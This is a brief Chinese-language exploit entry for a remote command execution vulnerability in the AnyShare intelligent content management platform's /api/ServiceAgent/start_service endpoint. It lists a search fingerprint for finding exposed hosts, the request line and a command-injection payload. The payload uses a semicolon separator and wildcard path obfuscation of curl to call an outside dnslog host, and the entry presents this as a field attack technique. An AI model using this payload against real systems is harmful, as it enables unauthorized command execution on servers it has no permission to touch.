# 爱数AnyShare智能内容管理平台start_service存在远程命令执行漏洞

爱数AnyShare智能内容管理平台 ｜ 命令执行 ｜ —
- **指纹**：`body="/libs/hls.js/dist/hls.min.js"`
- **请求**：`POST /api/ServiceAgent/start_service HTTP/1.1`

**Payload**
```
["com;/u?r/b?n/c??l dnslog"]
```
- **响应特征**：200 PS：请求体中普通命令也是可以的，com;/u?r/b?n/c??l
;/u?r/b?n/c??l  匹配 /usr/bin/curl（;是命令分隔符，? 是通配符，类似 *）实战打法